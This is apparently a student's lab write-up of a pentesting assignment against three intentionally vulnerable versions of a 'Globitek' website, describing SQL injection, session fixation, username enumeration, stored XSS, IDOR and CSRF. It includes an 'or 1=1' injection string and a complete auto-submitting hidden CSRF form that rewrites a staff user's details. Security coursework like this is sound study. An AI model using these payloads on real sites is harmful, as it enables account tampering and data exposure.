# # Project 8 - Pentesting Live Targets

Time spent: 6 hours spent in total
Name: Minh Son

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.  

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection

![Alt Text](https://github.com/mhson281/Csuvets/blob/master/SQLI.gif)

The “Find a Saleperson” page of this target is vulnerable to SQL injection as shown.  When adding ‘or”1=1”’ right after the person ID, another user was displayed, showing that it can be manipulated to show different records in the database.


Vulnerability #2: Session Hijacking

![Alt Text](https://github.com/mhson281/Csuvets/blob/master/Session_Hijack.gif)

The staff’s login page is using fixed session ID.  Using the target’s session that is logged in and the convenient “change session id” tool, a hacker can set his session ID to match the target’s and gain access on another browser.


## Green

Vulnerability #1: User Enumeration

![Alt Text](https://github.com/mhson281/Csuvets/blob/master/User_Enumeration.gif)

The staff login page for the green target can be exploited using user enumeration.  When a nonexistent user logs in, the failed login attempt is given a class of “failed” and a non bold “Log in was unsuccessful” is displayed to the user.  When a known user like “pperson” logs in, the attempt is given the class of “failure” and a bold “Log in was unsuccessful” is shown to the user.  This vulnerability can be exploited to figure out which username actually exist in the database.


Vulnerability #2: Cross Site Scripting

![Alt Text](https://github.com/mhson281/Csuvets/blob/master/XSS_2_Week9.gif)
## 
The Green site’s “Contact Us” page allows the submission of Javascript code.  Then the code can later be executed when a Staff member logs into their account and check the Feedback section.


Red

Vulnerability #1: Indirect Object Reference

![Alt Text](https://github.com/mhson281/Csuvets/blob/master/IDOR.gif)

The “Find a SalePerson” page is vulnerable to an IDOR attack.  By changing the value in “id=“ users who are not publicly listed can be referenced in the browser.  While there are only 9 public id, user with the id 10 and 11 can be referenced as shown.

Vulnerability #2: _Cross-Site Request Forgery 

<html><body onload=“document.csrfForm.submit()”>
  <form action=“https://35.224.226.149/red/public/staff/users/edit.php?id=1” name=“csrfForm” target=“hiddenFrame” method=“POST”>
    <input type=“hidden” name=“first_name” value=“Jimmy” />
    <input type=“hidden” name=“last_name” value=“Got Hacked” />
    <input type=“hidden” name=“username” value=“Jimmy” />
    <input type=“hidden” name=“email” value=“hacker@attacker.com”>  
  </form>
  <iframe name=“hiddenFrame” style=“display: none;”></iframe>
<_body><_html>



![Alt Text](https://github.com/mhson281/Csuvets/blob/master/CSRF.gif)


Since the red site does not have CSRF protections on the staff area, an attacker can design a form that can submit data to a part of the website that requires admin access. In this walkthrough example, I show how an attacker can link a hidden form in their feedback that submits data to the edit page for a particular salesperson.





## 
